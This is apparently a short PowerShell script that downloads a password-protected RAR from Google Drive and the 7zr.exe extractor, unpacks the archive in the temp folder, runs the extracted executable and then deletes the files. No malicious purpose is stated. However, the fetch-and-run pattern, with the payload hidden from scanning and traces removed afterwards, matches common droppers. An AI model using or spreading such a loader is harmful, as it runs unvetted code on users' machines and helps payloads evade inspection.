# Prompt for the password
$rarPassword = Read-Host -Prompt "Enter password"

# Temporary paths
$tempFolder = [System.IO.Path]::Combine($env:TEMP, "temp_folder")
$tempRar = [System.IO.Path]::Combine($env:TEMP, "temp_archive.rar")
$temp7zr = [System.IO.Path]::Combine($tempFolder, "7zr.exe")
$extractedFile = [System.IO.Path]::Combine($tempFolder, "temp_executable.exe")

# URL to the RAR file
$fileID = "your_file_id_here"
$downloadUrl = "https://drive.google.com/uc?export=download&id=$fileID"

# URL to the 7zr.exe file
$sevenZipExeUrl = "https://7-zip.org/a/7zr.exe"

# Ensure the temporary folder exists
if (-Not (Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}

# Download the RAR file
Invoke-RestMethod -Uri $downloadUrl -OutFile $tempRar

# Download the 7zr.exe tool for extracting the RAR file
Invoke-RestMethod -Uri $sevenZipExeUrl -OutFile $temp7zr

# Extract the RAR file using 7zr.exe with the user-provided password
Start-Process -FilePath $temp7zr -ArgumentList "x `"$tempRar`" -p$rarPassword -o`"$tempFolder`" -y" -NoNewWindow -Wait

# Execute the extracted executable
Start-Process -FilePath $extractedFile -Wait

# Clean up: Remove temp folder and files
Remove-Item -Path $tempRar -Force
Remove-Item -Path $temp7zr -Force
Remove-Item -Path $tempFolder -Recurse -Force